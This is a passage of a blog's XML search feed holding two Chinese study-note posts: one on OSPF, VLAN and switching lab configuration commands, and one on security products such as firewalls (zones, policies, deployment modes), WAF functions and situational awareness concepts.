用于向对方请求所需要的LSA，设备只有在ospf邻居双方成功交换DD报文后才会向对方发出LSR报文<br>4.Link State ACK 用来对收到的LSA进行确认<br>​<br>ospf三大表:邻居表，链路信息表，路由表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">//ospf基础设置命令</span><br><span class="line">//创建并运行ospf进程</span><br><span class="line">ospf [proess-id|router-id id ]</span><br><span class="line"></span><br><span class="line">//创建并进入ospf区域</span><br><span class="line">area area-id</span><br><span class="line"></span><br><span class="line">//制定运行ospf的接口</span><br><span class="line">network network-address wildcard-ask</span><br><span class="line"></span><br><span class="line">//配置ospf接口开销</span><br><span class="line">ospf cost cost</span><br><span class="line"></span><br><span class="line">//设置ospf带宽参考值</span><br><span class="line">bandwidth-reference value</span><br><span class="line"></span><br><span class="line">//设置接口在选举DR时的优先级</span><br><span class="line">ospf dr-priority priority</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>实验二：使用动态路由来实现不同网段的互联1.给定下图网络拓扑<br><img src="/2024/03/13/%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1%E4%B8%8E%E4%BA%92%E8%81%94/1682425601849-05837fb2-0fb8-423a-9a51-e8c56be0dfdc.png" alt="1682425601849-05837fb2-0fb8-423a-9a51-e8c56be0dfdc"></p><p>ospf区域为0即骨干区<br>进入R1开启各个ospf接口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//R1</span><br><span class="line">[R1]ospf router-id 1.1.1.1   #id唯一标识R1</span><br><span class="line">[R1-ospf-1]area 0            #进入area 0</span><br><span class="line">[R1-ospf-1-area-0.0.0.0]</span><br><span class="line">[R1-ospf-1-area-0.0.0.0]network 11.1.1.1 0.0.0.0  #开启11.1.1.1接口，采用精准匹配</span><br><span class="line">[R1-ospf-1-area-0.0.0.0]network 21.1.1.0 0.0.0.3  #开启21.1.1.1接口，采用网络号与掩码反码匹配，21.1.1.1中网络号为30位</span><br><span class="line">[R1-ospf-1-area-0.0.0.0]network 192.168.1.0 0.0.0.255 #同21.1.1.1</span><br><span class="line">[R1-ospf-1-area-0.0.0.0]network 172.16.1.254 0.0.0.0 #精准匹配开启172.16.1.254</span><br><span class="line"></span><br><span class="line">//R2</span><br><span class="line">[R2]ospf router-id 2.2.2.2</span><br><span class="line">[R2-ospf-1]area 0</span><br><span class="line">[R2-ospf-1-area-0.0.0.0]network 11.1.1.2 0.0.0.3</span><br><span class="line">[R2-ospf-1-area-0.0.0.0]network 21.1.1.2 0.0.0.3</span><br><span class="line">[R2-ospf-1-area-0.0.0.0]network 10.10.10.0 0.0.0.255</span><br></pre></td></tr></table></figure><p>开启之后ospf会互相发送hello报文建立邻居关系，接着发送DB报文与LS请求来交换各自的链路信息并存储到各自的LSDB（链路状态数据库）中依次来建立邻接关系,<strong>其中当NeighborCurrentState&#x3D;Full时表示处于邻接稳定状态，邻居稳定状态为Two-way</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dis ospf lsdb |router  //查看链路状态数据库</span><br><span class="line">dis ospf routing      //查看ospf路由表</span><br><span class="line">display ospf peer     //查看当前路由的邻居</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><p>以太网协议以太网是当今现有局域网采用的最通用的通信协议标准，该标准定义了在局域网中采用的电缆类型和信号处理方法<br>以太网是建立在CSMA&#x2F;CD(载波监听多路访问&#x2F;冲突检测)机制上的广播型网络<br>早期采用总线型以太网，后面采用交换机组网</p><p>交换机vs路由器<br>交换机对数据帧的操作：<br>泛洪：交换机解析收到的数据帧的目的MAC地址，若在MAC地址表中未找到相应的目的MAC地址，则交换机会对该帧进行泛红操作；若交换机接受到的数据帧为广播帧，则会直接进行泛洪操作<br>转发：交换机接收数据帧，对目的MAC帧进行查表操作进行转发<br>丢弃：若数据帧的进接口与出接口是一样的，则会丢弃防止出现环路<br>路由器对ip数据报操作：转发，丢弃</p><p>交换机可以隔离冲突域<br>路由器可以隔离广播域<br>​<br>​<br>​<br>VlAN技术以太网中交换机不能隔离广播域，因此当网络规模较大时容易出现广播风暴，为了解决这个问题便出现了VLAN技术</p><p>VLAN划分基准：<br>基于接口<br>基于MAC地址<br>基于IP子网<br>基于协议<br>基于策略<br>实验三：通过vlan技术将隔离相同网段之间的设备实验拓扑图如下</p><p><img src="/2024/03/13/%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1%E4%B8%8E%E4%BA%92%E8%81%94/1683276798804-7f95a160-0c9b-4273-8207-ff70ed123bee.png" alt="1683276798804-7f95a160-0c9b-4273-8207-ff70ed123bee"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//创建vlan</span><br><span class="line">vlan id</span><br><span class="line">//删除vlan</span><br><span class="line">undo valn id</span><br><span class="line">//一次性创建多个vlan</span><br><span class="line">vlan batch 10,20,30</span><br><span class="line">//创建100格vlan</span><br><span class="line">vlan 100 to 200</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//使用基于接口类型的vlan</span><br><span class="line">//进入相应的接口</span><br><span class="line">interface e0/0/2</span><br><span class="line">//设置接口类型</span><br><span class="line">port link-type access</span><br><span class="line">//设置接口所属vlan</span><br><span class="line">port default vlan id</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>要设置的vlan如下图<br><img src="/2024/03/13/%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1%E4%B8%8E%E4%BA%92%E8%81%94/1683277602552-b849ba71-d214-42f1-95d6-151612236522.png" alt="1683277602552-b849ba71-d214-42f1-95d6-151612236522"></p><p>设置技术部所在的接口</p><p><img src="/2024/03/13/%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1%E4%B8%8E%E4%BA%92%E8%81%94/1683277703735-ad881c19-3047-4332-8678-8874cfac2fcc.png" alt="1683277703735-ad881c19-3047-4332-8678-8874cfac2fcc">设置销售部的vlan<br><img src="/2024/03/13/%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1%E4%B8%8E%E4%BA%92%E8%81%94/1683277802963-7caeed65-9511-4ddc-9ac0-0aec1ae2427a.png" alt="1683277802963-7caeed65-9511-4ddc-9ac0-0aec1ae2427a"></p><p><img src="/2024/03/13/%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1%E4%B8%8E%E4%BA%92%E8%81%94/1683277856845-8cef3b26-f3d5-489e-86e1-54f8181730e1.png" alt="1683277856845-8cef3b26-f3d5-489e-86e1-54f8181730e1"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//trunk类型接口的基础命令</span><br><span class="line">//配置接口类型</span><br><span class="line">port link-type trunk</span><br><span class="line">//配置trunk接口加入指定vlan</span><br><span class="line">port trunk allow-pass vlan&#123;&#123;vlan-id[to vlan-id2]&#125;|all&#125;</span><br><span class="line">//(可选)配置trunk接口的却省vlan</span><br><span class="line">port trunk pvid vlan vlan-id</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 读书 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>安全产品</title>
      <link href="/2024/03/13/%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81/"/>
      <url>/2024/03/13/%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81/</url>
      
        <content type="html"><![CDATA[<p>主要安全产品防火墙产品<br>WAF:WEB应用防火墙，专门用来保护web服务器<br>NGSOC:安全运营平台</p><p>网络设备：路由器，交换机<br>ICG上网行为，审计不安全的流量并进行放行控制<br>终端安全：天擎（保护终端的安全）<br>IPS:入侵检测系统<br>漏洞扫描工具（针对应用的漏洞，包括系统漏洞，结构漏洞，管理漏洞等）<br>代码审计（针对所有的代码python，php，css，jsp，java，js，go，c，mysql等来判断其中的安全隐患）<br><img src="/2024/03/13/%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81/1683341995533-3d439c72-3c9f-44ad-b07a-3d8058259ab3.png" alt="1683341995533-3d439c72-3c9f-44ad-b07a-3d8058259ab3"></p><p>安全设备一定会对网络数据传输起到延迟效果，延迟需要再客户接收的范围内</p><p>防火墙1 安全域（一个具有相同安全策略的节点的集所形成的区域，使用name来区别不同的安全域，使用优先级来区分安全域的安全等级，默认安全域的优先级是0-100，其值越大，安全级越高，FW默认情况下高安全级别的安全域可以直接访问低级别的安全域内的终端）<br>分类：<br>预定义：FW的厂商定义，默认有4个：trust（可信安全域），untrust（不可信安全域），DMZ(非军事化安全域)，local（代表防火墙本地所有接口）<br>trust：内网终端和服务器所在的区域<br>untrust：外网所在的区域<br>DMZ:内网提供对外服务的服务器所在的区域<br>local：防火墙的接口所在的区域<br>默认：不同的安全域之间不能直接通信，只能通过安全策略进行放行</p><p>自定义：客户自己定义的安全域，name随便设置，安全级别自由设置</p><p>防火墙的部署：（防火墙的接口）<br>        -路由模式：同时具备路由器和防火墙的功能<br>        -透明模式：同时具备二层交换机和防火墙的功能<br>        -旁路模式：将防火墙当成一台分析设备<br>        -混合模式：防火墙的接口模式不一样，有路由模式也有透明模式<br>防火墙的配置方式:<br>        -WEB界面<br>        -命令行<br>防火墙的登录方式:<br>        -以网线的方式登录，登陆之后使用WEB界面来配置设备<br>        将自己PC的网口通过网线连接FW的管理口（要么是MGT口，要么是G0&#x2F;0&#x2F;0），厂家提前在管理口配置好了ip地址，不同厂商配置ip地址不一样，如华为192.168.0.1&#x2F;24，奇安信是10.0.0.1&#x2F;24，自己的电脑配置同一网段的另一个地址，注意一些厂商会指定可信地址，此时，本地pc必须配置可信地址<br>        比如PC-HWFW<br>      192.168.0.2&#x2F;24 ——192.168.0.1&#x2F;24<br> 地址配置好之后，在pc上打开浏览器，在浏览器中输入厂商指定的网址，如华为<a href="https://192.168.0.1:8843/">https://192.168.0.1:8843</a> ,奇安信<a href="https://10.0.0.1,实现web配置/">https://10.0.0.1,实现web配置</a><br>防火墙功能：主要功能-过滤和访问控制<br>      -以console线登录防火墙，使用命令来配置设备<br>      本地PC通过console线连接FW的console接口，pc端使用usb接口和对方连接，此时，相当于将FW上的信息通过console线传递到pc端展现出来，在pc端使用第三方登录软件，如crt，登录防火墙进行命令行设置。<br>配置防火墙思路：<br>    -确定防火墙接口的模式：路由模式<br>    -配置接口参数：ip地址，安全域<br>    -配置安全策略<br>   -验证安全策略是否生效<br><img src="/2024/03/13/%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81/1683365464661-29702266-5bba-4eef-8894-8d2db58fc161.png" alt="1683365464661-29702266-5bba-4eef-8894-8d2db58fc161"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">//防火墙进入安全域</span><br><span class="line">[hwfw]firewall zone trust </span><br><span class="line">//将g/0/01接口划分为trust域</span><br><span class="line">[hwfw-zone-trust]add interface g0/0/1</span><br><span class="line"></span><br><span class="line">同理</span><br><span class="line">[hwfw]firewall zone untrust</span><br><span class="line">[hwfw-zone-untrust]add interface g0/0/2</span><br><span class="line"></span><br><span class="line">实现防火墙trust安全域的互通：</span><br><span class="line">流量互通的前提是路由可达</span><br><span class="line">1.路由可达</span><br><span class="line">2.配置安全策略放行相应安全域之间的流量互通资格</span><br><span class="line">security-policy  //进入安全策略</span><br><span class="line">rule name local_trust  //命令安全策略</span><br><span class="line">source-zone loacl       //源安全域</span><br><span class="line">destination-zone trust   //目的安全域</span><br><span class="line">action permit            // 允许local到trust的流量</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">source-zone trust       </span><br><span class="line">destination-zone local   //双向互通</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-在fw上配置安全策略，只放行untust到trust方向的流量</span><br><span class="line">security-policy</span><br><span class="line">rule name untrust_trust</span><br><span class="line">source-zone untrust</span><br><span class="line">destination-zone trust</span><br><span class="line">action permit</span><br><span class="line">此时，出现从untrust主动访问trust的流量可以实现进出，但是从trust主动访问untrust的流量不允许进出</span><br><span class="line">/*</span><br><span class="line">针对ping流量，只要请求包可以通过FW，那么请求包的回应报文，无论是否有相应的安全策略，都允许通过FW</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">/删除名为untrust_trust的安全策略</span><br><span class="line">undo rule name untrust_trust</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>扩展部分：<br>在内网搭建一台web服务器，放置在DMZ区域，要求外网的客户端可以访问企业的web服务器<br>-ip地址配置<br>fw：interface g1&#x2F;0&#x2F;2<br>       ip address 10.10.10.100&#x2F;24<br>firewall zone dmz<br>add interface g1&#x2F;0&#x2F;2</p><p>-配置路由和安全策略，实现web的客户端和服务器之间的互通<br>【isp】ip route-static 10.10.10.10 32 1.1.1.1<br>【hwfw】ip route-static 9.9.9.9 32 1.1.1.2<br>​<br>-安全策略的配置思路：前提Tcp流量由客户端主动访问服务器触发<br>若web服务器所在的安全域的优先级高，客户端所在的安全域的优先级低，此时防火墙上的安全策略只需要方向从低到高方向的安全策略<br>若web服务器所在的安全域的优先级低，客户端所在的安全域的优先级高，此时防火墙上的安全策略需要从低到高方向和从高到低方向的安全策略<br>​<br>防火墙技术： 5个技术<br>    -包过滤技术：包过滤防火墙，处理对象是单个数据包，并且只能查看数据包的三层及以下层的参数，可以识别数据包的sip&#x2F;dip&#x2F;smac&#x2F;dmac,协议号等参数。<br>    -状态检测技术：会话概念，session，处理对象是流量，根据流量的会话来识别流量进行过滤和防控，若某个会话被放行，那么和该会话相关的数据都会被放行，此时的防火墙会有一张会话表，来记录对不同会话的处理方式，根据会话表，当流量触发会话表之后，防火墙自动产生相应的安全策略来放行或者过滤对应的数据。主要针对tcp流量和icmp流量，防火墙可以识别4层及以下层的信息<br>     -应用代理技术：直接截取客户端访问应用服务器的流量，代替应用服务器和客户端之间进行数据传输。此时，防火墙需要识别出应用层的参数，对于客户端来说，访问对象一直是服务器，对于真正的服务器来说是，防火墙来访问他，不足之处，应用代理的兼容性，一个应用对应一个代理，DNS-DNS代理，应用树森及，代理软件也要升级。<br>     -应用识别技术：既可以识别流量的应用层，如qq，微信，爱奇艺等等，此时防火墙需要工作在应用层，通过应用层的参数来实现对不同应用的区分，主要的实现方法就是DPI,DFI，DFI是深度流检测，是根据数据流来识别应用，这种方法对于加密的数据也可以识别出来。误差率比较高。DPI是深度包检测，对单个数据包做解剖来实现应用的识别，但是若数据包被加密了，就识别不了，误差率低。防火墙可以随意的识别出数据的每一层参数。<br>      -内容检测技术：识别出数据包内的用户数据，可以通过用户数据来实现对流量更加精细的区分，通过敏感词来实现内部流量或者是外部流量的防控。<br>WAF应用防火墙作用：保护web服务器-网站<br>WEB-渗透–网址–网站结构，网站运行原理<br>网站–网址–域名<br>ip地址：在网络上唯一的标记某一个节点，一个域名可以同时对应多个ip地址，一个ip地址同时只能对应一个域名。<br>​<br>域名结构：<br>              根域 .<br>               顶级域名&#x2F;一级域名   分类：国家级&#x2F;行业<br>               二级域名：自定义&#x2F;全球统一的<br>               三级域名：一般都是www<br>​<br>​<br>web服务器：Micosoft IIs,Apache,Ngix,WebLogic<br>web应用系统安全漏洞分类：软件漏洞，结构漏洞，配置漏洞，管理漏洞<br>保护web系统安全主要从建设和运维两个角度来保障<br>1.系统建设期间：系统建设期间综合利用防火墙系统，漏洞扫描系统，安全审计和数据备份系统等产品对web系统进行安全保护<br>2.运维期间：系统运维期间安全运维人员应及时并修复系统中的安全漏洞，对于保障web系统安全也非常重要</p><p>web安全主要保护服务器及其数据的安全，保护服务器和用户之间传递的信息的安全，保护web应用客户端及其环境安全这三个方面<br>​<br>web安全威胁前沿趋势：<br>1.不当信息公开导致大量政府网站信息泄露<br>2.勒索软件大量入侵服务器<br>3.挖矿木马的疯狂敛财暗流<br>4.反人工检测技术大范围流行<br>5.物联网威胁更加突出<br>6Weblogic反序列化漏洞攻击可能爆发</p><p>waf五大基本功能：<br>web非授权访问的防御<br>web攻击的防御<br>web恶意代码的防御<br>web应用交付能力<br>web应用合规功能<br>​<br>​<br>态势感知三个层面：感知，理解，预测<br>一级SA：感知相关元素的状态，属性和动作<br>二级SA：现状的理解，通过理解数据块的重要性，具有2级SA的个体将特定目标相关的含义和意义与手头的信息相关联<br>三级SA：对未来状态的映射，一旦人们知道这些元素是什么以及他们对于当前目标意味着什么，预测这些在（至少在短期内）将做什么<br>​<br>态势感知建设目的：<br>检测，分析和响应，预测预防，防御<br>​</p>]]></content>
      
      
      <categories>
          
          <category> 读书 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全产品 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
